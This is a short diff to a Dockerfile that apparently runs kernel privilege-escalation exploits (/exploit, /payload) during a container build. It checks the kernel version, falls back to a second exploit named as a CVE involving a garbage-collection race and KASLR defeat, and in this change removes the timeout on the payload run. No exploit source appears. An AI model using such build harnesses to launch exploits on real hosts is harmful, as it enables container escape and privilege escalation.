@@ -8,7 +8,7 @@ RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
 
-ARG CACHEBUST=1580
+ARG CACHEBUST=1581
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
@@ -26,7 +26,7 @@ case "$KVER" in \
     echo "SCTPHANTOM EXIT=$EC_SCTP" >&2; \
     if [ "$EC_SCTP" != "0" ]; then \
       echo "--- FALLBACK: CVE-2026-80521 (SCC GC race, plurality KASLR) ---"; \
-      timeout 1200 /payload 2>&1; \
+      /payload 2>&1; \
       EC=$?; \
       echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
       echo "SCC_EXPLOIT EXIT=$EC" >&2; \
